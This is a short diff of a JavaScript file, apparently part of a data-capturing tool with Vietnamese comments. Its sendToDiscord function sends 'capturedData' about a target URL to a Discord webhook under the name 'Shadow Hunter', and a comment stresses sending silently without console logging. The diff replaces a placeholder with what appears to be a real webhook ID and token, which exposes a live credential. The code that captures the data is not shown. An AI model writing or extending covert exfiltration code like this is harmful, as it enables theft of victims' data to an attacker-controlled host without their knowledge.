@@ -31,7 +31,7 @@ else {
 
 function sendToDiscord(targetUrl, capturedData) {
     // Thay WEBHOOK_URL của bạn vào đây
-    var discordUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"; 
+    var discordUrl = "https://discordapp.com/api/webhooks/1454906156777472165/tLAGpqP0YKRK0HjgzhHat-CTb3s6OMiFrPqzse_KZ8NfD16FsgXiNmKbqxyqyaKPX1ST"; 
     
     var data = {
         "username": "Shadow Hunter",
@@ -64,3 +64,4 @@ function sendToDiscord(targetUrl, capturedData) {
         // Gửi ngầm, không cần log ra console để tránh spam
     });
 }
+
